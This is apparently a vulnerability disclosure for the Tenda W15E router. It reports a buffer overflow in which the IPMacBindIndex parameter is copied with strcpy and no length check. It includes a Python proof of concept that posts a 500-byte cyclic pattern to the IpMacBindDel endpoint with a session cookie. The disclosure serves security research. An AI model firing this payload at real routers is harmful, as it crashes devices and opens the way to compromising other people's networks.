# W15E buff overflow vulnerability
Vendor: Tenda W15E
Version: US_W15EV1.0br_V15.11.0.13(1068_1523_841)_CN_TDC

Description：There is a buff overflow vulnerability in W15E router. The function is 0x000690C8. IndexSet gets the content of IPMacBindIndex and uses the strcpy without check the length, which result in buffer overflow.

The static analysis is as follows: 
![image](https://github.com/sezangel/IOT-vul/assets/89381625/a1594de5-f831-46b2-875b-f488f77deb89)

POC:

```python
import requests
from pwn import *

url='http://192.168.100.2/goform/IpMacBindDel'
payload=cyclic(500)
header={
'Host': '192.168.100.2',
'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0',
'Accept':'*/*',
'Accept-Language':'en-US,en;q=0.5',
'Accept-Encoding':'gzip, deflate',
'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
'X-Requested-With':'XMLHttpRequest',
'Origin':'http://192.168.100.2',
'Connection':'close',
'Referer':'http://192.168.100.2/mac_filter.html?random=0.008005922687726486&',
'Cookie':'password=17399d7fb9cf0644a1f50f015116919dcabazx'} 

data1 ='IPMacBindIndex=%s'%payload
ret = requests.post(url = url ,headers = header,data = data1, verify=False)
```


![ad266ca80ca83012a4786f0d5ef9748](https://github.com/user-attachments/assets/cec3f0ee-70dc-443a-8d7b-d943f08e375f)

